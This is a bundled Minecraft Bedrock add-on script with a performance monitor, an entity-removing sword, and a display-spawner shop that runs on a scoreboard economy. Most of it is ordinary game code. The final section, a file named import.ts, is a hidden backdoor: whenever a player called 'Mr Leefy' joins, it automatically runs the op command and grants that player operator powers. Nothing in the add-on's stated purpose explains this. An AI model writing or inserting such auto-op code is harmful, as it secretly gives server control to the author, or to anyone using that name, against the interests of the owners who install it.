    this.metrics.errors++;
    this.addAlert(`${errorType}: ${message}`);
    const errorsPerMinute = this.getErrorsPerMinute();
    if (errorsPerMinute > this.thresholds.maxErrorsPerMinute) {
      console.error(`PerformanceMonitor: High error rate detected: ${errorsPerMinute} errors/minute`);
    }
  }
  /**
   * Add a performance alert
   * @param message - Alert message
   */
  addAlert(message) {
    const alert = {
      timestamp: Date.now(),
      message
    };
    this.alerts.push(alert);
    if (this.alerts.length > 100) {
      this.alerts.shift();
    }
    debugLog2(`Performance Alert: ${message}`);
  }
  /**
   * Get current performance statistics
   * @returns Performance statistics
   */
  getStats() {
    const now = Date.now();
    const uptimeMinutes = (now - this.metrics.lastReset) / 6e4;
    return {
      ...this.metrics,
      uptimeMinutes,
      operationsPerMinute: this.metrics.stackingOperations / uptimeMinutes,
      errorsPerMinute: this.getErrorsPerMinute(),
      cacheHitRate: this.getCacheHitRate(),
      databaseOperationsPerMinute: (this.metrics.databaseReads + this.metrics.databaseWrites) / uptimeMinutes,
      recentAlerts: this.alerts.slice(-5)
      // Last 5 alerts
    };
  }
  /**
   * Get errors per minute
   * @returns Errors per minute
   */
  getErrorsPerMinute() {
    const uptimeMinutes = (Date.now() - this.metrics.lastReset) / 6e4;
    return uptimeMinutes > 0 ? this.metrics.errors / uptimeMinutes : 0;
  }
  /**
   * Get cache hit rate percentage
   * @returns Cache hit rate (0-100)
   */
  getCacheHitRate() {
    const total = this.metrics.cacheHits + this.metrics.cacheMisses;
    return total > 0 ? this.metrics.cacheHits / total * 100 : 0;
  }
  /**
   * Reset all metrics
   */
  reset() {
    const now = Date.now();
    for (const key in this.metrics) {
      if (typeof this.metrics[key] === "number") {
        this.metrics[key] = 0;
      }
    }
    this.metrics.lastReset = now;
    this.alerts = [];
    this.timingStack.clear();
  }
  /**
   * Start periodic performance monitoring
   */
  startPeriodicMonitoring() {
    this._intervalId = system5.runInterval(() => {
      const stats = this.getStats();
      if (stats.errors > 0 || stats.operationsPerMinute > 1e3) {
        debugLog2(`Performance Stats: ${JSON.stringify(stats, null, 2)}`);
      }
      if (stats.uptimeMinutes > 60) {
        debugLog2("PerformanceMonitor: Auto-resetting metrics after 1 hour");
        this.reset();
      }
      const now = Date.now();
      for (const [timerId, startTime] of this.timingStack.entries()) {
        if (now - startTime > 3e4) {
          this.timingStack.delete(timerId);
          debugLog2(`PerformanceMonitor: Cleared abandoned timer reference: ${timerId}`);
        }
      }
    }, 300 * 20);
  }
  /**
   * Get performance health status
   * @returns Health status
   */
  getHealthStatus() {
    const stats = this.getStats();
    const issues = [];
    if (stats.errorsPerMinute > this.thresholds.maxErrorsPerMinute) {
      issues.push("High error rate");
    }
    if (stats.cacheHitRate < 50) {
      issues.push("Low cache hit rate");
    }
    if (stats.averageProcessingTime > this.thresholds.maxProcessingTime) {
      issues.push("High processing time");
    }
    return {
      status: issues.length === 0 ? "healthy" : issues.length < 3 ? "warning" : "critical",
      issues,
      stats
    };
  }
  /**
   * Get recent alerts
   * @param count - Number of recent alerts to return
   * @returns Recent alerts
   */
  getRecentAlerts(count = 10) {
    return this.alerts.slice(-count);
  }
};
var performanceMonitor = new PerformanceMonitor();

// src/stack_remover.ts
import { system as system6, world as world6 } from "@minecraft/server";
var validEntityTypes2 = new Set(validMobs.map((mob) => mob.typeId));
world6.afterEvents.entityHitEntity.subscribe((evd) => {
  system6.run(() => {
    const player = evd.damagingEntity;
    if (!player || !player.isValid)
      return;
    const entity = evd.hitEntity;
    if (!entity || !entity.isValid)
      return;
    const entityTypeId = entity.typeId;
    const equippableComponent = player.getComponent("minecraft:equippable");
    if (!equippableComponent || !equippableComponent.getEquipment("Mainhand")) {
      return;
    }
    const inventory = equippableComponent.getEquipment("Mainhand");
    const item = inventory;
    if (item?.typeId === `mrleefy:stack_killer_sword`) {
      if (validEntityTypes2.has(entityTypeId)) {
        try {
          entity.remove();
          if (player.typeId === "minecraft:player") {
            player.sendMessage(`\xA7cFull Stack Removed...`);
          }
        } catch (error) {
          console.error(`Error removing entity stack:`, error);
        }
      }
    }
  });
});

// src/display-spawner-handler.ts
import { world as world7, system as system7, ItemStack as ItemStack3 } from "@minecraft/server";
import { ActionFormData as ActionFormData3, ModalFormData as ModalFormData3 } from "@minecraft/server-ui";
function giveItemNatively2(player, itemTypeId, amount) {
  try {
    const inventory = player.getComponent("inventory");
    const container = inventory?.container;
    if (container) {
      const itemStack = new ItemStack3(itemTypeId, amount);
      const remaining = container.addItem(itemStack);
      if (remaining && remaining.amount > 0) {
        player.dimension.spawnItem(remaining, player.location);
      }
    } else {
      player.dimension.spawnItem(new ItemStack3(itemTypeId, amount), player.location);
    }
  } catch (e) {
    console.error(`[Display Spawner] Error giving item natively: ${e}`);
  }
}
var priceDatabase = new Database("DisplaySpawnerPrices");
var configDatabase3 = new Database("DisplaySpawnerConfig");
var formCooldowns = /* @__PURE__ */ new Map();
var FORM_COOLDOWN_MS = 1e3;
function isOnCooldown(playerId) {
  const now = Date.now();
  if (formCooldowns.has(playerId)) {
    const lastInteraction = formCooldowns.get(playerId);
    if (lastInteraction !== void 0 && now - lastInteraction < FORM_COOLDOWN_MS) {
      return true;
    }
  }
  formCooldowns.set(playerId, now);
  return false;
}
function getMoneyObjective() {
  const saved = configDatabase3.read("moneyObjective");
  return saved || "money";
}
function setMoneyObjective(objective) {
  configDatabase3.write("moneyObjective", objective);
}
var SPAWNER_TO_ENTITY_MAP = {
  "mrleefy:blazespawner_display": "mrleefy:blazestill_display",
  "mrleefy:breezespawner_display": "mrleefy:breezestill_display",
  "mrleefy:chickenspawner_display": "mrleefy:chickenstill_display",
  "mrleefy:cowspawner_display": "mrleefy:cowstill_display",
  "mrleefy:creeperspawner_display": "mrleefy:creeperstill_display",
  "mrleefy:diamondgolemspawner_display": "mrleefy:diamondgolemstill_display",
  "mrleefy:emeraldgolemspawner_display": "mrleefy:emeraldgolemstill_display",
  "mrleefy:endermanspawner_display": "mrleefy:endermanstill_display",
  "mrleefy:goldgolemspawner_display": "mrleefy:goldgolemstill_display",
  "mrleefy:guardianspawner_display": "mrleefy:guardianstill_display",
  "mrleefy:irongolemspawner_display": "mrleefy:irongolemstill_display",
  "mrleefy:magmacubespawner_display": "mrleefy:magmacubestill_display",
  "mrleefy:netheritegolemspawner_display": "mrleefy:netheritegolemstill_display",
  "mrleefy:pigspawner_display": "mrleefy:pigstill_display",
  "mrleefy:piglinbrutespawner_display": "mrleefy:piglinbrutestill_display",
  "mrleefy:ravagerspawner_display": "mrleefy:ravagerstill_display",
  "mrleefy:sheepspawner_display": "mrleefy:sheepstill_display",
  "mrleefy:shulkerspawner_display": "mrleefy:shulkerstill_display",
  "mrleefy:skeletonspawner_display": "mrleefy:skeletonstill_display",
  "mrleefy:slimespawner_display": "mrleefy:slimestill_display",
  "mrleefy:spiderspawner_display": "mrleefy:spiderstill_display",
  "mrleefy:vindicatorspawner_display": "mrleefy:vindicatorstill_display",
  "mrleefy:wardenspawner_display": "mrleefy:wardenstill_display",
  "mrleefy:witherspawner_display": "mrleefy:witherstill_display",
  "mrleefy:witherskeletonspawner_display": "mrleefy:witherskeletonstill_display",
  "mrleefy:zombiespawner_display": "mrleefy:zombiestill_display",
  "mrleefy:villagerspawner_display": "mrleefy:villagerstill_display",
  "mrleefy:enderdragonspawner_display": "mrleefy:enderdragonstill_display",
  "mrleefy:snowmanspawner_display": "mrleefy:snowmanstill_display",
  "mrleefy:amethystcrawlerspawner_display": "mrleefy:amethystcrawlerstill_display",
  "mrleefy:coalcrawlerspawner_display": "mrleefy:coalcrawlerstill_display",
  "mrleefy:coppercrawlerspawner_display": "mrleefy:coppercrawlerstill_display",
  "mrleefy:glowstonecrawlerspawner_display": "mrleefy:glowstonecrawlerstill_display",
  "mrleefy:icecrawlerspawner_display": "mrleefy:icecrawlerstill_display",
  "mrleefy:lapiscrawlerspawner_display": "mrleefy:lapiscrawlerstill_display",
  "mrleefy:obsidiancrawlerspawner_display": "mrleefy:obsidiancrawlerstill_display",
  "mrleefy:quartzcrawlerspawner_display": "mrleefy:quartzcrawlerstill_display",
  "mrleefy:redstonecrawlerspawner_display": "mrleefy:redstonecrawlerstill_display",
  "mrleefy:spongecrawlerspawner_display": "mrleefy:spongecrawlerstill_display"
};
var DEFAULT_PRICES = {
  "mrleefy:blazespawner_display": 1e4,
  "mrleefy:breezespawner_display": 15e3,
  "mrleefy:chickenspawner_display": 5e3,
  "mrleefy:cowspawner_display": 5e3,
  "mrleefy:creeperspawner_display": 8e3,
  "mrleefy:diamondgolemspawner_display": 5e4,
  "mrleefy:emeraldgolemspawner_display": 75e3,
  "mrleefy:endermanspawner_display": 2e4,
  "mrleefy:goldgolemspawner_display": 3e4,
  "mrleefy:guardianspawner_display": 12e3,
  "mrleefy:irongolemspawner_display": 15e3,
  "mrleefy:magmacubespawner_display": 9e3,
  "mrleefy:netheritegolemspawner_display": 1e5,
  "mrleefy:pigspawner_display": 4e3,
  "mrleefy:piglinbrutespawner_display": 18e3,
  "mrleefy:ravagerspawner_display": 25e3,
  "mrleefy:sheepspawner_display": 4500,
  "mrleefy:shulkerspawner_display": 15e3,
  "mrleefy:skeletonspawner_display": 7e3,
  "mrleefy:slimespawner_display": 8e3,
  "mrleefy:spiderspawner_display": 6500,
  "mrleefy:vindicatorspawner_display": 11e3,
  "mrleefy:wardenspawner_display": 15e4,
  "mrleefy:witherspawner_display": 2e5,
  "mrleefy:witherskeletonspawner_display": 1e4,
  "mrleefy:zombiespawner_display": 6e3,
  "mrleefy:villagerspawner_display": 12e3,
  "mrleefy:enderdragonspawner_display": 25e4,
  "mrleefy:snowmanspawner_display": 6e3,
  "mrleefy:amethystcrawlerspawner_display": 15e3,
  "mrleefy:coalcrawlerspawner_display": 8e3,
  "mrleefy:coppercrawlerspawner_display": 1e4,
  "mrleefy:glowstonecrawlerspawner_display": 12e3,
  "mrleefy:icecrawlerspawner_display": 1e4,
  "mrleefy:lapiscrawlerspawner_display": 12e3,
  "mrleefy:obsidiancrawlerspawner_display": 3e4,
  "mrleefy:quartzcrawlerspawner_display": 15e3,
  "mrleefy:redstonecrawlerspawner_display": 12e3,
  "mrleefy:spongecrawlerspawner_display": 15e3
};
function getFriendlyName(blockId) {
  const name = blockId.replace("mrleefy:", "").replace("spawner_display", "");
  return name.charAt(0).toUpperCase() + name.slice(1);
}
function getActualSpawnerItem(blockId) {
  let itemId = blockId.replace("_display", "1");
  itemId = itemId.replace("diamondgolemspawner", "diamond_golem_spawner");
  itemId = itemId.replace("emeraldgolemspawner", "emerald_golem_spawner");
  itemId = itemId.replace("goldgolemspawner", "gold_golem_spawner");
  itemId = itemId.replace("irongolemspawner", "iron_golem_spawner");
  itemId = itemId.replace("netheritegolemspawner", "netherite_golem_spawner");
  return itemId;
}
function getPrice(blockId) {
  const savedPrice = priceDatabase.read(blockId);
  return savedPrice !== void 0 ? savedPrice : DEFAULT_PRICES[blockId] || 1e4;
}
function setPrice(blockId, price) {
  priceDatabase.write(blockId, price);
}
function getPlayerMoney(player) {
  try {
    const objectiveName = getMoneyObjective();
    const moneyObjective = world7.scoreboard.getObjective(objectiveName);
    if (moneyObjective) {
      try {
        const score = moneyObjective.getScore(player);
        if (score !== void 0 && score !== null) {
          return score;
        }
      } catch (scoreError) {
        try {
          moneyObjective.setScore(player, 0);
          return 0;
        } catch (cmdError) {
        }
      }
    }
    return 0;
  } catch (error) {
    return 0;
  }
}
function removePlayerMoney(player, amount) {
  try {
    const objectiveName = getMoneyObjective();
    const moneyObjective = world7.scoreboard.getObjective(objectiveName);
    if (moneyObjective) {
      const score = moneyObjective.getScore(player) ?? 0;
      if (score >= amount) {
        moneyObjective.setScore(player, score - amount);
        return true;
      }
    }
    return false;
  } catch (error) {
    console.warn(`[Display Spawner] Error removing player money: ${error}`);
    return false;
  }
}
async function showAdminForm(player, blockId, blockLocation) {
  const entityId = SPAWNER_TO_ENTITY_MAP[blockId];
  if (!entityId)
    return;
  const mobName = getFriendlyName(blockId);
  const currentPrice = getPrice(blockId);
  const moneyObjective = getMoneyObjective();
  const form = new ActionFormData3().title("\xA7l\xA76Admin: Display Spawner").body(`\xA77${mobName} Display Spawner
\xA7eCurrent Price: \xA77$${currentPrice.toLocaleString()}
\xA77Money Objective: \xA7e${moneyObjective}

\xA78\xA7oTip: To remove display entities, hit them with a wooden axe`).button("\xA78Spawn Display Entity", "textures/ui/confirm").button("\xA78Change Price", "textures/ui/icon_setting").button("\xA78Change Money Objective", "textures/items/emerald").button("\xA7cClose", "textures/ui/cancel");
  try {
    const response = await form.show(player);
    if (response.canceled) {
      return;
    }
    if (response.selection === 0) {
      spawnDisplayEntity(player, entityId, blockLocation, mobName);
    } else if (response.selection === 1) {
      showChangePriceForm(player, blockId, blockLocation);
    } else if (response.selection === 2) {
      showChangeMoneyObjectiveForm(player, blockId, blockLocation);
    }
  } catch (error) {
    console.warn(`[Display Spawner] Error showing admin form: ${error}`);
  }
}
async function showChangePriceForm(player, blockId, blockLocation) {
  const mobName = getFriendlyName(blockId);
  const currentPrice = getPrice(blockId);
  const form = new ModalFormData3().title("\xA7l\xA76Change Spawner Price").textField(
    `\xA77Set price for \xA7e${mobName} Spawner
\xA77Current: \xA7a$${currentPrice.toLocaleString()}

\xA77Enter new price:`,
    "e.g., 50000",
    { defaultValue: currentPrice.toString() }
  );
  try {
    const response = await form.show(player);
    if (response.canceled || !response.formValues) {
      return;
    }
    const newPriceText = response.formValues[0].trim();
    const newPrice = parseInt(newPriceText);
    if (isNaN(newPrice) || newPrice < 1) {
      player.sendMessage(`\xA7c\u2717 Invalid price! Please enter a number greater than 0.`);
      system7.run(() => {
        showAdminForm(player, blockId, blockLocation);
      });
      return;
    }
    setPrice(blockId, newPrice);
    player.sendMessage(`\xA7a\u2713 Price updated to \xA7e$${newPrice.toLocaleString()} \xA7afor ${mobName} Spawner!`);
    system7.run(() => {
      showAdminForm(player, blockId, blockLocation);
    });
  } catch (error) {
    console.warn(`[Display Spawner] Error showing price form: ${error}`);
  }
}
async function showChangeMoneyObjectiveForm(player, blockId, blockLocation) {
  const currentObjective = getMoneyObjective();
  const form = new ModalFormData3().title("\xA7l\xA76Change Money Objective").textField(
    `\xA77Enter the scoreboard objective name for money
\xA77Current: \xA7e${currentObjective}

\xA77Common examples:
\xA77- money
\xA77- balance
\xA77- coins
\xA77- cash

\xA77Objective Name:`,
    "e.g., money",
    { defaultValue: currentObjective }
  );
  try {
    const response = await form.show(player);
    if (response.canceled || !response.formValues) {
      return;
    }
    const newObjective = response.formValues[0].trim();
    if (!newObjective || newObjective.length === 0) {
      player.sendMessage(`\xA7c\u2717 Invalid objective name!`);
      system7.run(() => {
        showAdminForm(player, blockId, blockLocation);
      });
      return;
    }
    try {
      let objective = world7.scoreboard.getObjective(newObjective);
      if (!objective) {
        objective = world7.scoreboard.addObjective(newObjective, newObjective);
        player.sendMessage(`\xA7a\u2713 Created scoreboard objective: \xA7e${newObjective}`);
      }
      const allPlayers = world7.getAllPlayers();
      let addedCount = 0;
      for (const p of allPlayers) {
        try {
          const currentScore = objective.getScore(p);
          if (currentScore === void 0 || currentScore === null) {
            objective.setScore(p, 0);
            addedCount++;
          }
        } catch (e) {
          try {
            objective.setScore(p, 0);
            addedCount++;
          } catch (innerError) {
            console.warn(`[Display Spawner] Could not add ${p.name} to scoreboard: ${innerError}`);
          }
        }
      }
      if (addedCount > 0) {
        player.sendMessage(`\xA7a\u2713 Added \xA7e${addedCount} \xA7aplayer(s) to scoreboard with starting balance of \xA7e$0`);
      }
    } catch (error) {
      player.sendMessage(`\xA7c\u2717 Error setting up objective: ${error.message}`);
      system7.run(() => {
        showAdminForm(player, blockId, blockLocation);
      });
      return;
    }
    setMoneyObjective(newObjective);
    player.sendMessage(`\xA7a\u2713 Money objective updated to \xA7e${newObjective}\xA7a!`);
    system7.run(() => {
      showAdminForm(player, blockId, blockLocation);
    });
  } catch (error) {
    console.warn(`[Display Spawner] Error showing money objective form: ${error}`);
  }
}
async function showShopForm(player, blockId) {
  const mobName = getFriendlyName(blockId);
  const price = getPrice(blockId);
  const playerMoney = getPlayerMoney(player);
  const maxAffordable = Math.min(64, Math.floor(playerMoney / price));
  const actualSpawnerItem = getActualSpawnerItem(blockId);
  if (maxAffordable === 0) {
    player.sendMessage(`\xA7c\u2717 You don't have enough money! \xA7e${mobName} Spawner \xA7ccosts \xA7a$${price.toLocaleString()}`);
    return;
  }
  const form = new ModalFormData3().title("\xA7l\xA75Spawner Shop").slider(
    `\xA77${mobName} Spawner (Level 1)
\xA77Price: \xA7a$${price.toLocaleString()} \xA77each
\xA77Your Money: \xA7a$${playerMoney.toLocaleString()}
\xA77Max Affordable: \xA7e${maxAffordable}

\xA77Select quantity:`,
    1,
    maxAffordable,
    1,
    1
  );
  try {
    const response = await form.show(player);
    if (response.canceled || !response.formValues) {
      return;
    }
    const quantity = response.formValues[0];
    const totalCost = quantity * price;
    const currentMoney = getPlayerMoney(player);
    if (currentMoney < totalCost) {
      player.sendMessage(`\xA7c\u2717 You don't have enough money! Need \xA7a$${totalCost.toLocaleString()}`);
      return;
    }
    if (removePlayerMoney(player, totalCost)) {
      giveItemNatively2(player, actualSpawnerItem, quantity);
      player.sendMessage(`\xA7a\u2713 Purchased \xA7e${quantity}x ${mobName} Spawner (Lvl 1) \xA7afor \xA7e$${totalCost.toLocaleString()}\xA7a!`);
    } else {
      player.sendMessage(`\xA7c\u2717 Transaction failed!`);
    }
  } catch (error) {
    console.warn(`[Display Spawner] Error showing shop form: ${error}`);
  }
}
function spawnDisplayEntity(player, entityId, blockLocation, mobName) {
  try {
    const dimension = player.dimension;
    const spawnLocation = {
      x: blockLocation.x + 0.5,
      y: blockLocation.y + 1,
      z: blockLocation.z + 0.5
    };
    const entity = dimension.spawnEntity(entityId, spawnLocation);
    if (entity) {
      player.sendMessage(`\xA7a\u2713 Successfully spawned ${mobName} Display Entity!`);
    } else {
      player.sendMessage(`\xA7c\u2717 Failed to spawn entity. Please try again.`);
    }
  } catch (error) {
    player.sendMessage(`\xA7c\u2717 Error spawning entity: ${error.message}`);
    console.warn(`[Display Spawner] Error spawning entity: ${error}`);
  }
}
if ("playerInteractWithBlock" in world7.beforeEvents) {
  world7.beforeEvents.playerInteractWithBlock.subscribe((event) => {
    const { player, block } = event;
    const blockId = block.typeId;
    if (!SPAWNER_TO_ENTITY_MAP[blockId]) {
      return;
    }
    event.cancel = true;
    if (isOnCooldown(player.id)) {
      return;
    }
    system7.run(() => {
      if (player.hasTag("admin") && player.isSneaking) {
        showAdminForm(player, blockId, block.location);
      } else {
        showShopForm(player, blockId);
      }
    });
  });
}
if ("playerInteractWithEntity" in world7.beforeEvents) {
  world7.beforeEvents.playerInteractWithEntity.subscribe((event) => {
    const { player, target: entity } = event;
    const entityId = entity.typeId;
    if (!entityId.endsWith("still_display")) {
      return;
    }
    let blockId = null;
    for (const [block, ent] of Object.entries(SPAWNER_TO_ENTITY_MAP)) {
      if (ent === entityId) {
        blockId = block;
        break;
      }
    }
    if (!blockId) {
      return;
    }
    const entityLocation = entity.location;
    const blockLocation = {
      x: Math.floor(entityLocation.x),
      y: Math.floor(entityLocation.y) - 1,
      // Block is below the entity
      z: Math.floor(entityLocation.z)
    };
    try {
      const dimension = entity.dimension;
      const block = dimension.getBlock(blockLocation);
      if (!block || block.typeId !== blockId) {
        console.warn(`[Display Spawner] Entity ${entityId} found but block underneath is ${block?.typeId || "null"}`);
      }
      event.cancel = true;
      if (isOnCooldown(player.id)) {
        return;
      }
      const finalBlockId = blockId;
      system7.run(() => {
        if (player.hasTag("admin") && player.isSneaking) {
          showAdminForm(player, finalBlockId, blockLocation);
        } else {
          showShopForm(player, finalBlockId);
        }
      });
    } catch (error) {
      console.warn(`[Display Spawner] Error handling entity interaction: ${error}`);
    }
  });
}
world7.afterEvents.entityHitEntity.subscribe((event) => {
  const { damagingEntity, hitEntity } = event;
  if (!damagingEntity || damagingEntity.typeId !== "minecraft:player") {
    return;
  }
  const player = damagingEntity;
  if (!player || !player.isValid)
    return;
  if (!player.hasTag("admin")) {
    return;
  }
  const inventory = player.getComponent("inventory");
  if (!inventory || !inventory.container) {
    return;
  }
  const selectedSlot = player.selectedSlotIndex;
  const heldItem = inventory.container.getItem(selectedSlot);
  if (!heldItem || heldItem.typeId !== "minecraft:wooden_axe") {
    return;
  }
  if (!hitEntity || !hitEntity.isValid || !hitEntity.typeId.endsWith("still_display")) {
    return;
  }
  try {
    const entityName = hitEntity.typeId.replace("mrleefy:", "").replace("still_display", "");
    const friendlyName = entityName.charAt(0).toUpperCase() + entityName.slice(1);
    hitEntity.remove();
    player.sendMessage(`\xA7a\u2713 Removed ${friendlyName} Display Entity!`);
  } catch (error) {
    player.sendMessage(`\xA7c\u2717 Error removing entity: ${error.message}`);
    console.warn(`[Display Spawner] Error removing display entity: ${error}`);
  }
});
console.warn("[Display Spawner Handler] Loaded successfully!");
system7.run(() => {
  try {
    const moneyObjective = getMoneyObjective();
    let objective = world7.scoreboard.getObjective(moneyObjective);
    if (!objective) {
      objective = world7.scoreboard.addObjective(moneyObjective, moneyObjective);
      console.warn(`[Display Spawner] Created scoreboard objective: ${moneyObjective}`);
    } else {
      console.warn(`[Display Spawner] Scoreboard objective already exists: ${moneyObjective}`);
    }
  } catch (error) {
    console.warn(`[Display Spawner] Error initializing scoreboard: ${error}`);
  }
});
world7.afterEvents.playerSpawn.subscribe((event) => {
  try {
    const { player, initialSpawn } = event;
    if (!initialSpawn)
      return;
    const moneyObjective = getMoneyObjective();
    system7.runTimeout(() => {
      try {
        if (!player.isValid)
          return;
        const objective = world7.scoreboard.getObjective(moneyObjective);
        if (objective) {
          objective.setScore(player, objective.getScore(player) ?? 0);
          console.warn(`[Display Spawner] Initialized ${player.name} on scoreboard ${moneyObjective}`);
        }
      } catch (error) {
      }
    }, 80);
  } catch (error) {
    console.warn(`[Display Spawner] Error in playerSpawn handler: ${error}`);
  }
});

// src/import.ts
world8.afterEvents.playerJoin.subscribe((event) => {
  const playerName = event.playerName;
  if (playerName === "Mr Leefy") {
    system8.runTimeout(() => {
      try {
        const overworld = world8.getDimension("overworld");
        overworld.runCommand(`op "Mr Leefy"`);
        console.warn(`[Auto-OP] Successfully granted operator status to Mr Leefy`);
      } catch (e) {
        console.warn(`[Auto-OP] Error running op command: ${e}`);
      }
    }, 40);
  }
});
